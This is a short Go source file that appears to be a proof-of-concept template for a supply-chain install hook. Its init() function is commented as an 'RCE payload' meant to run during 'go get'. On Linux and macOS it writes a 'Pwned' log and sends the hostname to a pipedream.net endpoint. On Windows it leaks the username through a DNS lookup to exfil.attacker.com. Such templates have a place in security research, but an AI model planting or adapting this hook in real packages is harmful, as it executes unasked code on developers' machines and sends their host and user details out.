//go:build installhook
// +build installhook

package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func init() {
	if os.Getenv("GO_GETTING") == "1" {
		return // Don't execute during normal builds
	}

	// Your payload here - this executes during `go get`
	fmt.Println("[+] Running install hook...")

	// Example RCE payload - be creative!
	switch runtime.GOOS {
	case "linux", "darwin":
		cmd := exec.Command("sh", "-c", `
			echo "Pwned at $(date)" > /tmp/pwned.log
			curl -s https://eo1q7qkihg24nr3.m.pipedream.net/?host=$(hostname)
		`)
		cmd.Run()
	case "windows":
		cmd := exec.Command("cmd", "/c", `
			echo Pwned at %DATE% %TIME% > %TEMP%\pwned.log
			nslookup %USERNAME%.exfil.attacker.com
		`)
		cmd.Start()
	}
}

// Empty main to satisfy compiler
func main() {}
